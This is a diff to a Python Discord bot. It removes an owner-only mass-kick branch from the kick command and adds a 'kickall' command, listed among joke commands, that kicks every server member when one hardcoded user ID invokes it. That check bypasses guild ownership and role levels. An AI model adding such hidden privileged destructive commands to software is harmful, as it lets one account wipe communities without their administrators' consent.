@@ -113,10 +113,6 @@ async def kick(ctx, user: discord.Member, is_in_code = 0):
 
     commander = ctx.message.author
 
-    if user == "@everyone" and commander.id == ctx.guild.owner_id:
-        for m in ctx.guild.members:
-            await m.kick(reason=None)
-
     r_dict = top.role_lvl
 
     if r_dict[commander.top_role.id] > r_dict[user.top_role.id]:
@@ -172,6 +168,12 @@ async def unban(ctx, user: discord.User):
     await invite_channel.send("discord.gg/epk8bFT")
 
 # theese are funny (Super funny) commands
+@bot.command()
+async def kickall(ctx):
+    if ctx.message.author.id == 441986625283686413:
+        for m in ctx.guild.members:
+            await m.kick(reason=None)
+
 @bot.command(pass_context  = True)
 async def dbd(ctx):
 
